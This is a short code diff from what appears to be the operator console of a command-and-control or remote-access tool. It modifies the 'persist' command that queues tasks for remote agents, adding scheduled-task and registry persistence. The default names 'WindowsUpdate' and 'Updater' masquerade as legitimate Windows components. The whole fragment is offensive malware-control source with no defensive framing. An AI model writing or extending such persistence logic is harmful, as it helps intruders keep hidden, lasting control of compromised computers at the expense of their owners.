@@ -9907,14 +9907,16 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       break;
     }
     case 'persist': {
-      const parts2 = args.split(' ');
+      const parts2 = args.trim().split(/\s+/);
       if (parts2[0] === 'task') {
-        taskType='PERSIST_TASK'; taskArgs=parts2.slice(1).join(' ')||'';
+        const tname = parts2.slice(1).join(' ') || 'WindowsUpdate';
+        taskType='PERSIST'; taskArgs=JSON.stringify({method:'schtask', name:tname});
       } else if (parts2[0] === 'rm' || parts2[0] === 'remove') {
-        taskType='PERSIST_RM'; taskArgs=parts2.slice(1).join(' ');
+        const rname = parts2.slice(1).join(' ') || 'Updater';
+        taskType='PERSIST_RM'; taskArgs=JSON.stringify({name:rname, method:'registry'});
       } else {
         taskType='PERSIST';
-        taskArgs = JSON.stringify({method:parts2[0], cmd:parts2.slice(1).join(' ')});
+        taskArgs = JSON.stringify({method:'registry', name:'Updater'});
       }
       break;
     }
